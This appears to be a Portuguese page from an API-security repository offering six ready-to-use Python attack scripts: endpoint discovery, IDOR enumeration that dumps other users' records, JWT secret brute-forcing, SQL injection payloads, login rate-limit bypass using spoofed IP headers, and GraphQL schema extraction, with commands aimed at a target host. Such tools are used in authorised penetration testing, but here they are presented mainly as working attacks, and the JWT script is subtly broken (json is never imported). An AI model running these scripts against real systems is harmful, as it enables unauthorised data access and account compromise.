# 🤖 SCRIPTS DE AUTOMAÇÃO - API Security

6 scripts prontos para usar em testes de API

---

## Script 1: Descoberta Automática de Endpoints

```python
#!/usr/bin/env python3
# discover-api.py

import requests
import sys
from concurrent.futures import ThreadPoolExecutor

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://api.example.com"

PATHS = [
    "/api", "/api/v1", "/api/v2",
    "/users", "/products", "/orders", "/admin",
    "/graphql", "/swagger.json", "/openapi.json",
    "/api/auth", "/api/login", "/api/profile"
]

print(f"[*] Descobrindo endpoints em {TARGET}")

def check_endpoint(path):
    try:
        r = requests.get(TARGET + path, timeout=3, verify=False)
        if r.status_code < 400:
            print(f"[+] {path} (Status: {r.status_code})")
            return (path, r.status_code)
    except:
        pass
    return None

with ThreadPoolExecutor(max_workers=10) as executor:
    results = list(executor.map(check_endpoint, PATHS))

print(f"\n[+] Found {len([r for r in results if r])} endpoints")
```

---

## Script 2: BOLA/IDOR Tester

```python
#!/usr/bin/env python3
# bola-tester.py

import requests
import sys
import json

API_URL = sys.argv[1] if len(sys.argv) > 1 else "https://api.example.com"
TOKEN = sys.argv[2] if len(sys.argv) > 2 else ""

print(f"[*] BOLA Testing em {API_URL}")

def test_bola(endpoint, id_range=100):
    print(f"\n[*] Testando {endpoint}")
    
    headers = {}
    if TOKEN:
        headers['Authorization'] = f'Bearer {TOKEN}'
    
    results = []
    
    for id_val in range(1, id_range):
        url = f"{API_URL}{endpoint.replace('{id}', str(id_val))}"
        
        try:
            r = requests.get(url, headers=headers, timeout=5)
            
            if r.status_code == 200:
                print(f"  [+] ID {id_val}: ✅ Acessível")
                results.append((id_val, r.json() if 'application/json' in r.headers.get('content-type', '') else r.text))
            elif r.status_code == 404:
                print(f"  [-] ID {id_val}: 404 Not Found")
            else:
                print(f"  [!] ID {id_val}: {r.status_code}")
        except Exception as e:
            pass
    
    if results:
        print(f"\n[+] Encontrados {len(results)} IDs acessíveis!")
        for id_val, data in results[:5]:  # Mostrar primeiros 5
            print(f"    ID {id_val}: {json.dumps(data, indent=2)[:200]}")
    
    return results

# Testar endpoints comuns
endpoints = [
    "/api/users/{id}",
    "/api/orders/{id}",
    "/api/products/{id}",
    "/api/profile/{id}"
]

for endpoint in endpoints:
    test_bola(endpoint)
```

---

## Script 3: JWT Analyzer & Bruteforcer

```python
#!/usr/bin/env python3
# jwt-bruteforce.py

import jwt
import sys
import requests
from itertools import product
import base64

TOKEN = sys.argv[1] if len(sys.argv) > 1 else ""

if not TOKEN:
    print("Usage: python3 jwt-bruteforce.py <token> [wordlist]")
    sys.exit(1)

print(f"[*] Analisando JWT: {TOKEN[:50]}...")

try:
    # Decode sem verificação
    decoded = jwt.decode(TOKEN, options={"verify_signature": False})
    print("\n[+] JWT Decoded:")
    print(f"  Header: {decoded}")
    
    # Checar por fraquezas
    parts = TOKEN.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    
    if header.get('alg') == 'none':
        print("\n[!] CRÍTICO: Algoritmo 'none' detectado!")
    
    if header.get('alg') == 'HS256':
        print("\n[*] Tentando bruteforce de secret...")
        
        WORDLIST = [
            "password", "123456", "secret", "key", "admin",
            "test", "jwt", "token", "supersecret", "changeme"
        ]
        
        for secret in WORDLIST:
            try:
                payload = jwt.decode(TOKEN, secret, algorithms=['HS256'])
                print(f"\n[+] SECRET ENCONTRADO: {secret}")
                print(f"  Payload: {payload}")
                break
            except:
                pass
        else:
            print("[-] Secret não encontrado em wordlist")

except Exception as e:
    print(f"[-] Erro: {e}")
```

---

## Script 4: SQL Injection Tester

```python
#!/usr/bin/env python3
# sqli-tester.py

import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://api.example.com"
ENDPOINT = sys.argv[2] if len(sys.argv) > 2 else "/api/search"

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT NULL,NULL--",
    "' AND SLEEP(5)--"
]

print(f"[*] SQL Injection Testing em {TARGET}{ENDPOINT}")

for payload in PAYLOADS:
    url = f"{TARGET}{ENDPOINT}?q={payload}"
    
    try:
        r = requests.get(url, timeout=10, verify=False)
        
        # Heurísticas para detectar SQLi
        if len(r.text) > 1000:  # Resposta grande
            print(f"[!] Payload: {payload}")
            print(f"    Response size: {len(r.text)} bytes")
            print(f"    Status: {r.status_code}")
            
            if r.status_code == 200 and "error" not in r.text.lower():
                print(f"    [+] POSSÍVEL SQLi!")
                
    except requests.exceptions.Timeout:
        print(f"[!] Payload: {payload} - Timeout (possível Sleep-based SQLi)")

print("\n[+] Teste completo")
```

---

## Script 5: Rate Limit Bypass

```python
#!/usr/bin/env python3
# rate-limit-bypass.py

import requests
import threading
import time
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://api.example.com"
ENDPOINT = sys.argv[2] if len(sys.argv) > 2 else "/api/login"

print(f"[*] Rate Limit Testing em {TARGET}{ENDPOINT}")

# Teste 1: Requisições normais
print("\n[1] Teste normal (com delay):")
for i in range(5):
    r = requests.post(TARGET + ENDPOINT, json={"username":"test","password":"test"})
    print(f"    Request {i+1}: Status {r.status_code}")
    time.sleep(1)

# Teste 2: Requisições simultâneas (race condition)
print("\n[2] Teste simultâneo (sem delay):")
results = []

def make_request():
    try:
        r = requests.post(TARGET + ENDPOINT, json={"username":"test","password":"test"})
        results.append(r.status_code)
    except:
        results.append(0)

threads = [threading.Thread(target=make_request) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()

success = sum(1 for s in results if s == 200)
rate_limited = sum(1 for s in results if s == 429)

print(f"    Sucesso: {success}/10")
print(f"    Rate Limited (429): {rate_limited}/10")

# Teste 3: Headers de bypass
print("\n[3] Teste com headers de bypass:")

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"}
]

for headers in BYPASS_HEADERS:
    r = requests.post(TARGET + ENDPOINT, headers=headers, json={"username":"test","password":"test"})
    print(f"    {headers}: Status {r.status_code}")
```

---

## Script 6: GraphQL Introspection Extractor

```python
#!/usr/bin/env python3
# graphql-introspect.py

import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://api.example.com/graphql"

INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
        args { name type { name } }
      }
      inputFields {
        name
        type { name }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
"""

print(f"[*] GraphQL Introspection em {TARGET}")

try:
    r = requests.post(TARGET, json={"query": INTROSPECTION_QUERY}, timeout=10)
    
    if r.status_code == 200:
        data = r.json()
        
        if 'data' in data and data['data'] and '__schema' in data['data']:
            print("[+] Introspection habilitado!")
            
            schema = data['data']['__schema']
            
            # Mostrar tipos
            print("\n[*] Tipos descobertos:")
            for type_obj in schema.get('types', [])[:10]:
                print(f"  - {type_obj['name']}")
            
            # Mostrar queries
            print("\n[*] Queries disponíveis:")
            query_type = schema.get('queryType', {})
            if query_type:
                for field in schema['types']:
                    if field['name'] == query_type['name']:
                        for q in field.get('fields', []):
                            print(f"  - {q['name']}")
            
            # Mostrar mutations
            print("\n[*] Mutations disponíveis:")
            mutation_type = schema.get('mutationType', {})
            if mutation_type:
                for field in schema['types']:
                    if field['name'] == mutation_type['name']:
                        for m in field.get('fields', []):
                            print(f"  - {m['name']}")
            
            # Salvar schema completo
            with open('schema.json', 'w') as f:
                json.dump(data, f, indent=2)
            print("\n[+] Schema salvo em schema.json")
        else:
            print("[-] Introspection desabilitado ou erro na resposta")
            print(f"    Resposta: {r.text[:200]}")
    else:
        print(f"[-] Erro: Status {r.status_code}")
        
except Exception as e:
    print(f"[-] Erro: {e}")
```

---

## Uso dos Scripts

```bash
# 1. Descobrir endpoints
python3 discover-api.py https://api.target.com

# 2. Testar BOLA
python3 bola-tester.py https://api.target.com "bearer_token_here"

# 3. Analisar JWT
python3 jwt-bruteforce.py "eyJhbGc..."

# 4. Testar SQLi
python3 sqli-tester.py https://api.target.com /api/search

# 5. Rate Limit
python3 rate-limit-bypass.py https://api.target.com /api/login

# 6. GraphQL Introspection
python3 graphql-introspect.py https://api.target.com/graphql
```

---

## 📊 COMPARAÇÃO DE FERRAMENTAS

| Script | Automação | Velocidade | Efetividade |
|---|---|---|---|
| Descoberta | 100% | Rápido | Alto |
| BOLA Tester | 100% | Rápido | Alto |
| JWT Bruteforce | 100% | Médio | Alto |
| SQLi Tester | 80% | Rápido | Médio |
| Rate Limit | 100% | Rápido | Alto |
| GraphQL | 100% | Rápido | Alto |

---

**Próximo:** Volte para [API-SECURITY-MASTER-README.md](./API-SECURITY-MASTER-README.md)

